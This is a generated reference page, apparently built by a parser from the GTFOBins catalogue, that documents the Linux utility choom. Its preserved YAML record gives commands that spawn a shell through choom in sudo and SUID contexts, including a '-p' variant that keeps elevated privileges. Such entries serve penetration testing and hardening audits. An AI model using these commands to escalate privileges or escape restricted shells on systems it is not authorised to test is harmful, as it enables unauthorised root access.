---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# choom

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `choom` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/choom` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [choom](../../tools/linux/choom.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | choom |
| name | choom |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/choom/ |

## Preserved Source Material

```yaml
_body: ''
_name: choom
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/choom
functions:
  shell:
  - code: choom -n 0 /bin/sh
    contexts:
      sudo: null
      suid:
        code: choom -n 0 -- /bin/sh -p
        shell: false
      unprivileged: null
```
